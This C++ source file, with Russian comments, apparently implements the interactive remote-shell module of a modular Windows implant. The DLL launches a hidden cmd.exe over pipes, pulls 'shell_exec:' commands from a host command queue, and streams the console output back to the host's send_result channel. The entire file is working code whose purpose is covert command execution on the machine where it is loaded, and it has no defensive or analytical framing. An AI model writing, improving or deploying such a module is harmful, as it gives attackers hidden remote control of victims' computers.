// Modules/Shell/shell.cpp — FINAL FIX: PeekNamedPipe + Immediate Send
// Компиляция: cl /LD /MT /O2 shell.cpp /Fe:shell.dll kernel32.lib user32.lib

#include <windows.h>
#include <stdio.h>
#include <string.h>

struct ModuleAPI {
    void (*send_result)(const unsigned char* data, unsigned long long len);
    void (*log)(const char* msg);
    const char* (*get_command)(const char* key);
};

// Глобальное состояние
static volatile bool g_running = true;
static volatile bool g_shell_active = false;
static CRITICAL_SECTION g_cs;
static HANDLE g_hInputWrite = NULL;
static HANDLE g_hOutputRead = NULL;
static HANDLE g_hProcess = NULL;
static HANDLE g_hReadThread = NULL;
static HANDLE g_hWriteThread = NULL;

static void (*g_send_result)(const unsigned char*, unsigned long long) = nullptr;
static void (*g_log)(const char*) = nullptr;
static const char* (*g_get_command)(const char*) = nullptr;

void sh_log(const char* msg) {
    CreateDirectoryA("C:\\temp", NULL);
    HANDLE h = CreateFileA("C:\\temp\\shell.log", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        SetFilePointer(h, 0, NULL, FILE_END);
        DWORD w; WriteFile(h, msg, (DWORD)strlen(msg), &w, NULL);
        CloseHandle(h);
    }
    if (g_log) g_log(msg);
}

char* oem_to_utf8(const char* oem_str) {
    if (!oem_str) return NULL;
    int wlen = MultiByteToWideChar(CP_OEMCP, 0, oem_str, -1, NULL, 0);
    if (wlen <= 0) return NULL;
    wchar_t* wstr = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, wlen * sizeof(wchar_t));
    if (!wstr) return NULL;
    MultiByteToWideChar(CP_OEMCP, 0, oem_str, -1, wstr, wlen);
    
    int utflen = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
    if (utflen <= 0) { HeapFree(GetProcessHeap(), 0, wstr); return NULL; }
    char* utf8_str = (char*)HeapAlloc(GetProcessHeap(), 0, utflen);
    if (utf8_str) WideCharToMultiByte(CP_UTF8, 0, wstr, -1, utf8_str, utflen, NULL, NULL);
    HeapFree(GetProcessHeap(), 0, wstr);
    return utf8_str;
}

char* utf8_to_oem(const char* utf8_str) {
    if (!utf8_str) return NULL;
    int wlen = MultiByteToWideChar(CP_UTF8, 0, utf8_str, -1, NULL, 0);
    if (wlen <= 0) return NULL;
    wchar_t* wstr = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, wlen * sizeof(wchar_t));
    if (!wstr) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, utf8_str, -1, wstr, wlen);
    
    int olen = WideCharToMultiByte(CP_OEMCP, 0, wstr, -1, NULL, 0, NULL, NULL);
    if (olen <= 0) { HeapFree(GetProcessHeap(), 0, wstr); return NULL; }
    char* oem_str = (char*)HeapAlloc(GetProcessHeap(), 0, olen);
    if (oem_str) WideCharToMultiByte(CP_OEMCP, 0, wstr, -1, oem_str, olen, NULL, NULL);
    HeapFree(GetProcessHeap(), 0, wstr);
    return oem_str;
}

// ← ФИКС: Прямая отправка без чанкинга для shell (надёжнее)
void send_shell_output(const char* data, int len) {
    if (!data || len <= 0) return;
    
    int prefix_len = 9; // strlen("SHELL_OUT")
    int total_len = prefix_len + 1 + len + 1; // "SHELL_OUT:" + data + "\n"
    
    unsigned char* out = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, total_len);
    if (!out) return;
    
    memcpy(out, "SHELL_OUT:", prefix_len);
    out[prefix_len] = ':';
    memcpy(out + prefix_len + 1, data, len);
    out[total_len - 1] = '\n';
    
    g_send_result(out, total_len);
    HeapFree(GetProcessHeap(), 0, out);
}

// ← ФИКС: ReadThread на PeekNamedPipe + немедленная отправка
DWORD WINAPI ReadThread(LPVOID) {
    sh_log("SHELL: ReadThread started (PeekNamedPipe mode)\n");
    
    char buffer[32768]; // 32 КБ буфер чтения
    DWORD bytes_available = 0;
    DWORD read = 0;
    int total_read = 0;
    
    while (g_running && g_shell_active) {
        // ← КЛЮЧЕВОЙ ФИКС: PeekNamedPipe проверяет данные БЕЗ блокировки
        if (!PeekNamedPipe(g_hOutputRead, NULL, 0, NULL, &bytes_available, NULL)) {
            DWORD err = GetLastError();
            if (err == ERROR_BROKEN_PIPE) {
                sh_log("SHELL: Pipe closed by cmd.exe\n");
                break;
            }
            char msg[64];
            sprintf_s(msg, "SHELL: PeekNamedPipe failed (Err:%lu)\n", err);
            sh_log(msg);
            Sleep(10);
            continue;
        }
        
        if (bytes_available == 0) {
            // Данных нет — короткая пауза, не грузим CPU
            Sleep(10);
            continue;
        }
        
        // Данные есть — читаем ВСЁ, что доступно
        read = 0;
        if (ReadFile(g_hOutputRead, buffer, sizeof(buffer) - 1, &read, NULL) && read > 0) {
            total_read += read;
            buffer[read] = '\0';
            
            char dbg[96];
            sprintf_s(dbg, "SHELL: Read %lu bytes (available was %lu, total: %d)\n", 
                     read, bytes_available, total_read);
            sh_log(dbg);
            
            // Конвертация OEM → UTF-8
            char* utf8_data = oem_to_utf8(buffer);
            if (utf8_data) {
                int utf8_len = (int)strlen(utf8_data);
                // ← НЕМЕДЛЕННАЯ ОТПРАВКА: не ждём "конца сообщения"
                send_shell_output(utf8_data, utf8_len);
                HeapFree(GetProcessHeap(), 0, utf8_data);
                sh_log("SHELL: Sent converted chunk\n");
            } else {
                // Фоллбэк: отправляем как есть
                send_shell_output(buffer, (int)read);
                sh_log("SHELL: Conversion failed, sent raw\n");
            }
        } else {
            DWORD err = GetLastError();
            char msg[128];
            sprintf_s(msg, "SHELL: ReadFile failed (Err:%lu, total_read:%d)\n", err, total_read);
            sh_log(msg);
            if (err == ERROR_BROKEN_PIPE || err == ERROR_NO_DATA) break;
            Sleep(10);
        }
    }
    
    char final_msg[64];
    sprintf_s(final_msg, "SHELL: ReadThread exited (total: %d bytes)\n", total_read);
    sh_log(final_msg);
    return 0;
}

DWORD WINAPI WriteThread(LPVOID) {
    sh_log("SHELL: WriteThread started\n");
    while (g_running && g_shell_active) {
        if (g_get_command) {
            const char* cmd = g_get_command("shell");
            if (cmd && strlen(cmd) > 0) {
                sh_log("SHELL: Got command from queue\n");
                if (strstr(cmd, "shell_stop")) {
                    g_shell_active = false;
                    sh_log("SHELL: Stop command received\n");
                    break;
                } else if (strstr(cmd, "shell_exec:")) {
                    const char* exec_cmd = strstr(cmd, "shell_exec:") + 11;
                    if (g_hInputWrite && strlen(exec_cmd) > 0) {
                        char full_cmd[4096];
                        char* oem_cmd = utf8_to_oem(exec_cmd);
                        if (oem_cmd) {
                            sprintf_s(full_cmd, "%s\r\n", oem_cmd);
                            HeapFree(GetProcessHeap(), 0, oem_cmd);
                        } else {
                            sprintf_s(full_cmd, "%s\r\n", exec_cmd);
                        }
                        
                        DWORD written = 0;
                        if (!WriteFile(g_hInputWrite, full_cmd, (DWORD)strlen(full_cmd), &written, NULL)) {
                            char err_msg[64];
                            sprintf_s(err_msg, "SHELL: WriteFile failed (Err:%lu)\n", GetLastError());
                            sh_log(err_msg);
                        } else {
                            FlushFileBuffers(g_hInputWrite);
                            sh_log("SHELL: Command written to pipe\n");
                        }
                    }
                }
            }
        }
        Sleep(50);
    }
    sh_log("SHELL: WriteThread stopped\n");
    return 0;
}

// ← ФИКС: 64 КБ буфер пайпа + правильные флаги
bool start_shell() {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE }; // bInheritHandle = TRUE
    HANDLE hInputRead, hOutputWrite;
    
    // 65536 байт = 64 КБ буфер для каждого направления
    if (!CreatePipe(&hInputRead, &g_hInputWrite, &sa, 65536) ||
        !CreatePipe(&g_hOutputRead, &hOutputWrite, &sa, 65536)) {
        sh_log("SHELL: Failed to create pipes\n");
        return false;
    }
    
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = hInputRead;
    si.hStdOutput = hOutputWrite;
    si.hStdError = hOutputWrite;
    
    PROCESS_INFORMATION pi = { 0 };
    // CREATE_NO_WINDOW + bInheritHandles=TRUE для передачи пайпов
    if (!CreateProcessA(NULL, "cmd.exe /k", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        sh_log("SHELL: Failed to start cmd.exe\n");
        CloseHandle(hInputRead); CloseHandle(g_hInputWrite);
        CloseHandle(g_hOutputRead); CloseHandle(hOutputWrite);
        return false;
    }
    
    // Закрываем ненужные копии в родительском процессе
    CloseHandle(hInputRead);
    CloseHandle(hOutputWrite);
    CloseHandle(pi.hThread);
    
    g_hProcess = pi.hProcess;
    g_shell_active = true;
    
    g_hReadThread = CreateThread(NULL, 0, ReadThread, NULL, 0, NULL);
    g_hWriteThread = CreateThread(NULL, 0, WriteThread, NULL, 0, NULL);
    
    sh_log("SHELL: Started (64KB pipes, PeekNamedPipe read)\n");
    return true;
}

void stop_shell() {
    g_shell_active = false;
    if (g_hProcess && WaitForSingleObject(g_hProcess, 100) == WAIT_TIMEOUT) {
        TerminateProcess(g_hProcess, 0);
    }
    if (g_hReadThread) WaitForSingleObject(g_hReadThread, 2000);
    if (g_hWriteThread) WaitForSingleObject(g_hWriteThread, 2000);
    
    if (g_hInputWrite) CloseHandle(g_hInputWrite);
    if (g_hOutputRead) CloseHandle(g_hOutputRead);
    if (g_hProcess) CloseHandle(g_hProcess);
    if (g_hReadThread) CloseHandle(g_hReadThread);
    if (g_hWriteThread) CloseHandle(g_hWriteThread);
    
    g_hInputWrite = g_hOutputRead = g_hProcess = NULL;
    g_hReadThread = g_hWriteThread = NULL;
    sh_log("SHELL: Stopped and cleaned\n");
}

extern "C" __declspec(dllexport) int __stdcall Run(ModuleAPI* api) {
    if (!api || !api->send_result) return -1;
    g_send_result = api->send_result;
    g_log = api->log;
    g_get_command = api->get_command;
    
    InitializeCriticalSection(&g_cs);
    
    if (!start_shell()) {
        api->send_result((const unsigned char*)"SHELL_ERROR:Failed to start\n", 27);
        DeleteCriticalSection(&g_cs);
        return -1;
    }
    
    api->send_result((const unsigned char*)"SHELL_READY:Interactive shell started\n", 38);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        sh_log("SHELL: DLL_ATTACH\n");
    }
    if (ul_reason_for_call == DLL_PROCESS_DETACH) {
        sh_log("SHELL: DLL_DETACH\n");
        g_running = false;
        stop_shell();
        DeleteCriticalSection(&g_cs);
    }
    return TRUE;
}